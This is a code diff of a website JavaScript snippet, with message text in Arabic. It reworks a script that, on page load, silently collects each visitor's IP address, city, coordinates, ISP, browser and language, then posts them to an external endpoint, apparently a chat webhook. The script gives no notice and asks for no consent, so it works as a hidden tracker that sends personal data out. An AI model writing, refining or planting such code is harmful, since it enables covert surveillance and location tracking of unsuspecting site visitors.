@@ -1,13 +1,7 @@
-(async () => {
+window.addEventListener("DOMContentLoaded", async () => {
   try {
-    const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
-      fetch('https://api.ipify.org?format=json'),
-      fetch('https://api64.ipify.org?format=json'),
-      fetch('https://ipapi.co/json/')
-    ]);
-    const ipv4 = await ipv4Res.json();
-    const ipv6 = await ipv6Res.json();
-    const geo = await geoRes.json();
+    const ipv4 = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+    const geo = await fetch("https://ipapi.co/json/").then(res => res.json());
 
     const ua = navigator.userAgent;
     const lang = navigator.language;
@@ -15,14 +9,13 @@
     const time = `${now.getFullYear()}/${String(now.getMonth()+1).padStart(2,'0')}/${String(now.getDate()).padStart(2,'0')} ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
 
     const msg = `
-📥 دخول جديد:
+📥 دخول جديد للموقع:
 
-🔹 IPv4: ${ipv4.ip}
-🔹 IPv6: ${ipv6.ip || 'غير متوفر'}
+🧠 IP: ${ipv4.ip}
 🌍 الدولة: ${geo.country_name}
-🏙️ المدينة: ${geo.city}, ${geo.region}
-📡 الشركة: ${geo.org}
+🏙️ المدينة: ${geo.city} - ${geo.region}
 📌 الإحداثيات: ${geo.latitude}, ${geo.longitude}
+📡 الشركة: ${geo.org}
 🕰️ الوقت: ${time}
 🌐 المتصفح: ${ua}
 🈯 اللغة: ${lang}
@@ -34,6 +27,6 @@
       body: JSON.stringify({ content: msg })
     });
   } catch (e) {
-    console.log("فشل في جمع البيانات");
+    console.warn("فشل في إرسال البيانات:", e);
   }
-})();
+});
